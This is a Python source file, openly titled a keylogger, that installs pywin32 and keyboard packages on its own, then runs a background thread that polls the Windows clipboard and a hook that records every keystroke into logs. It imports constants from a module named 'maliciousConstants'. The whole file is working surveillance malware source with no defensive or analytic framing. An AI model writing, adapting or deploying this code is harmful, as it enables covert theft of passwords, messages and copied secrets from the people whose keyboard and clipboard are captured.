"""
Edan Jacobson
Keylogger that logs clipboard and keyboard
"""
import subprocess
import sys

try:
    subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"],
                   check=True)
    subprocess.run([sys.executable, "-m", "pip", "install", "keyboard"],
                   check=True)

    import win32clipboard
except ModuleNotFoundError as err:
    print(f"Module not found: {err}")
import keyboard
import time
import threading
from maliciousConstants import BACKSPACE, NEW_LINE, TAB, SPACE, \
    REMOVE_FIRST


class Keylogger:

    def __init__(self):
        """
        Method that creates keylogger object
        """
        date_time = time.ctime(time.time())
        self.logged_data = [
            f'[START OF KEY LOGS]\n  *~ Date/Time: {date_time}\n']
        self.copied_data = [
            f'[START OF CLIPBOARD LOGS]\n  *~ Date/Time: {date_time}\n']
        # Start a thread to track the clipboard
        self.clip_thread = threading.Thread(target=self.clipboard_tracker)
        self.clip_thread.start()
        # Start a thread to track the keyboard
        self.key_thread = keyboard.hook(self.keyboard_tracker)

    import win32clipboard
    import time

    def clipboard_tracker(self):
        """
        Method that tracks changes in clipboard and adds only text data
        to a file that stores all clipboard values
        """
        # Initialize the clipboard text
        txt = ""
        while True:
            try:
                # Open the clipboard
                win32clipboard.OpenClipboard()
                # Check if the clipboard contains text data
                if win32clipboard.IsClipboardFormatAvailable(
                        win32clipboard.CF_UNICODETEXT):
                    # Get the copied text data from the clipboard
                    copied = win32clipboard.GetClipboardData(
                        win32clipboard.CF_UNICODETEXT)
                    # If the copied text data is different from the previous clipboard text
                    if copied != txt:
                        self.copied_data.append(copied)
                        txt = copied
                # Close the clipboard
                win32clipboard.CloseClipboard()
                # Wait for 0.5 seconds
                time.sleep(0.5)
            except win32clipboard.error as err:
                # Handle clipboard errors
                if err.winerror == 0:
                    print("Error: Unable to retrieve clipboard data.")
                elif err.winerror == 1418:
                    # The clipboard is empty or contains non-text data
                    pass  # No action required
                else:
                    print(f"Error with clipboard: {err}")
            except Exception as e:
                # Handle other exceptions
                print(f"Unexpected error: {e}")

    def keyboard_tracker(self, event):
        key = event.name

        if event.event_type == keyboard.KEY_DOWN:
            # If the backspace key is pressed
            if key == 'backspace':
                self.logged_data.append(BACKSPACE)
            # If any other key is pressed
            else:
                if key == 'enter':
                    # If the enter key is pressed, write a newline character
                    self.logged_data.append(NEW_LINE)
                elif key == 'tab':
                    # If the tab key is pressed, write a tab character
                    self.logged_data.append(TAB)
                elif key == 'space':
                    # If the space key is pressed, write a space character
                    self.logged_data.append(SPACE)
                elif key == 'shift':
                    # If the shift key is pressed, do nothing
                    pass
                elif key == 'ctrl_l' or key == 'ctrl_r':
                    # If the control key is pressed, do nothing
                    pass
                elif key == 'esc':
                    # If the escape key is pressed, return
                    return
                else:
                    # Write the key to the file, removing the single quotes
                    self.logged_data.append(key)

    def remove_copied(self):
        """
        Method that removes data from copied data
        :return:
        """
        self.copied_data = self.copied_data[REMOVE_FIRST:]

    def remove_logged(self):
        """
        Method that removes data from logged data
        :return:
        """
        self.logged_data = self.logged_data[REMOVE_FIRST:]
